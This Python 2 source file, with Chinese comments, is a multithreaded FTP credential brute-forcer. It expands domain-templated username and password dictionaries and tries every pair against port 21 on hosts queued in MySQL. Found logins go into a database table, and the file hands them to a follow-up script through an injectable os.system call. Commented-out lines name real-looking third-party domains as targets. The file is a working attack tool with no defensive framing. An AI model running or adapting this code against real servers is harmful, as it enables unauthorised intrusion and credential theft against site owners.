#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
##################################################################
import csv
import re
import os
import linlkFTP   #线程控制文件
import mysql #数据库操作文件
from threading import Thread
from ftplib import FTP
from collections import defaultdict, deque
import time #获取时间和延时
import socket
socket.setdefaulttimeout(10)  #设置了全局默认超时时间
import threading

class PythonFtpScanner(threading.Thread):
    def __init__(self,cond,hostA):
        super(PythonFtpScanner, self).__init__()
        self.Chost=hostA

    def run(self):
        if self.Chost == '':  #传入值等于空   返回
            #print u"地址不能为空"
            linlkFTP.sql_sel()   #SQL查询
            return
        self.ftp_login(self.Chost)

    WEAK_USERNAME = [p.replace('\n','') for p in open('username.dic').readlines()]
    WEAK_PASSWORD = [p.replace('\n','') for p in open('password.dic').readlines()]

    def get_sdomain(self,domain):  #域名拆解www.baidu.com->baidu.com
        suffixes = 'ac', 'ad', 'ae', 'aero', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'arpa', 'as', 'asia', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'biz', 'bj', 'bm', 'bn', 'bo', 'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cat', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'com', 'coop', 'cr', 'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'ec', 'edu', 'ee', 'eg', 'er', 'es', 'et', 'eu', 'fi', 'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gov', 'gp', 'gq', 'gr', 'gs', 'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'id', 'ie', 'il', 'im', 'in', 'info', 'int', 'io', 'iq', 'ir', 'is', 'it', 'je', 'jm', 'jo', 'jobs', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn', 'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk', 'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me', 'mg', 'mh', 'mil', 'mk', 'ml', 'mm', 'mn', 'mo', 'mobi', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'name', 'nc', 'ne', 'net', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om', 'org', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn', 'pr', 'pro', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru', 'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj', 'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy', 'sz', 'tc', 'td', 'tel', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm', 'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug', 'uk', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi', 'vn', 'vu', 'wf', 'ws', 'xn', 'ye', 'yt', 'za', 'zm', 'zw'

        sdomain = []
        bdomain = False
        for section in domain.split('.'):
            if section in suffixes:
                sdomain.append(section)
                bdomain = True
            else:
                sdomain = [section]
        return '.'.join(sdomain) if bdomain  else ''

    def get_ssdomain(self,domain):  #域名拆解www.baidu.com->baidu
        sdomain = self.get_sdomain(domain)  #先解析一道
        ssdomian = sdomain.partition('.')[0] if sdomain else ''
        return ssdomian

    def ftp_login(self,host,nthreads=10,port=21): #传入名域名开始扫描
        #尝试登录  if success return username & password
        #print u"要扫描IP:",host,
        try:     #个不错我觉得不错  当连接失败     为什么后面还要进行  组合连接尝试呢
        # 我觉得其实后面  就没必要在进行组合了    为什么这个不在进入类之前就开始判断呢  或者进入类的时候
            ftpA = FTP()  #初始化FTP类
            ftpA.connect(host,port)  #连接 服务器名  端口号
            upf1 = "update  ftp set  ftpsend='send' where url='%s'"%(host)
            mysql.mysql_update(upf1)  #修改数据
        except Exception, e:
            #print u"\n%s服务器FTP21端口可能没有开放"%host
            upf2 = "update  ftp set  ftpsend='====' where url='%s'"%(host)
            mysql.mysql_update(upf2)  #修改数据
            linlkFTP.sql_sel()   #SQL查询
            return

        #print u"要扫描IP:",host,
        #得到sdomain和ssdomain
        domain = host   #不明白未什么还要赋值  直接使用host变量不就可以了吗
        sdomain = self.get_sdomain(domain)  #域名拆解www.baidu.com->baidu.com
        ssdomain = self.get_ssdomain(domain)  #域名拆解www.baidu.com->baidu
        #拆解不够完全有这样的一个玉米  123456.blog.baidu.com.cn   ！！！！！！！
        accounts = deque()   #list数组

        #准备 用户名和密码
        for username in PythonFtpScanner.WEAK_USERNAME:   #导入用户名#WEAK_USERNAME=username.dic
            if  '%domain%' in username or '%sdomain%' in username or '%ssdomain%' in username:
                if sdomain=='':
                    continue  #跳过
                else:
                    username = username.replace('%domain%',domain)  #返回根据正则表达式进行文字替换后的字符串的复制
                    username = username.replace('%sdomain%',sdomain)
                    username = username.replace('%ssdomain%',ssdomain)

            for password in PythonFtpScanner.WEAK_PASSWORD:   #导入密码#WEAK_PASSWORD=password.dic
                if '%domain%' in password or '%sdomain%' in password or '%ssdomain%' in password:
                    if sdomain=='':
                        continue  #跳过
                    else:
                        password = password.replace('%domain%',domain)
                        password = password.replace('%sdomain%',sdomain)
                        password = password.replace('%ssdomain%',ssdomain)

                password = password.replace('%null%','')
                password = password.replace('%username%',username)

                if (username,password) not in accounts:#list数组
                    accounts.append((username,password))#添加到 list数组
                    ##################################################################
        #print u"组合出",len(accounts),u" 次密码"
        if not accounts:   #数组无数据了就跳出
            print u"%s 数组无数据"% host
            #在从新读取
            linlkFTP.sql_sel()   #SQL查询
            return 0

        print u"扫描网站FTP:%s 开始"% host,

        class crackThread(Thread):
            #破解 帐户线程
            def __init__(self):
                Thread.__init__(self)
                self.running = True  #这是  控制线程数量
                self.ftp = FTP()  #初始化FTP类
                #self.p_p_p=0 #心跳包
                #self.ftp.set_debuglevel(2)  #打开调试级别2，显示详细信息

            def run(self):
                MAX_RETRIES = 10
                retry = 0
                account = None   #None=NULL  数组
                while self.running and accounts:#list数组

                    try:
                        self.ftp.connect(domain,port)  #连接 服务器名  端口号
                    except Exception, e:
                        if retry <= MAX_RETRIES:  #这是为了控制线程吗
                            retry = retry +1    #没必要使用这个变量啊
                            continue  #跳过
                        else:
                            self.running = False  #这是  控制线程
                            break   #跳出

                    print ".",
                    #重新每三次    为什么一个账户要连接3次  呢
                    loop_num = 0
                    while loop_num<3:
                        loop_num = loop_num + 1

                        if not account and accounts:#list数组
                            account = accounts.pop()   #list数组  输出

                        #绝对不要尝试
                        if not account:   #数组无数据了就跳出
                            break   #跳出

                        #print u'IP:',host,u'用户名:',account[0],u'密码:',account[1]
                        #print ".",
                        #print u"正在扫描%s\r"%host
                        try:
                            self.ftp.login(account[0],account[1])  #连接FTP
                            #没有异常发生，这是一个正确的帐号
                            print u'\nFTP连接成功IP:',host,u"用户名:",account[0],u"密码:",account[1],
                            sql = "insert into ftppassword(IP,user,password,time) values('%s','%s','%s','%s')"%(host,account[0],account[1],time.strftime('%Y.%m.%d-%H.%M.%S'))
                            mysql.mysql_insert(sql) #添加到数据库
                            os.system('python adminFTP.py %s %s %s'%(host,account[0],account[1]))
                            account = None  #None=NULL
                        except Exception, e:
                            emsg = str(e)    #调试信息

                            if 'connection' in emsg.lower() or 'tries' in emsg.lower():   #判断 连接  失败错误信息    不明白何意
                                retry = retry +1
                                break   #跳出
                            else:
                                #reset retry
                                account = None  #None=NULL
                                retry = 0

        threads = []  #线程
        for i in range(nthreads):  #nthreads=10  创建10个线程
            threads.append(crackThread())

        for thread in threads:   #不理解这是什么意思    是结束线程吗
            thread.start()  #start就是开始线程

        for thread in threads:   #不理解这是什么意思    是结束线程吗
            thread.join()
        print u"\n================%s扫描结束%s================"%(host,time.strftime('%Y.%m.%d-%H.%M.%S'))
        linlkFTP.sql_sel()   #SQL查询

    #if __name__ == '__main__':
    #mysql.mysql_open()  #连接数据库
#    ftp_cracker = PythonFtpScanner()
#    ftp_cracker.ftp_login("127.0.0.1")

#    cond = threading.Event()
#    hider1 = PythonFtpScanner(cond,"100wc.net")
#    hider2 = PythonFtpScanner(cond,"319heads.com")
#    hider3 = PythonFtpScanner(cond,"annalenaschiller.com")
#    hider1.start()
#    hider2.start()
#    hider3.start()

#    cond = threading.Event()
#    for i in range(50):
#        hider1 = PythonFtpScanner(cond,"")
#        hider1.start()
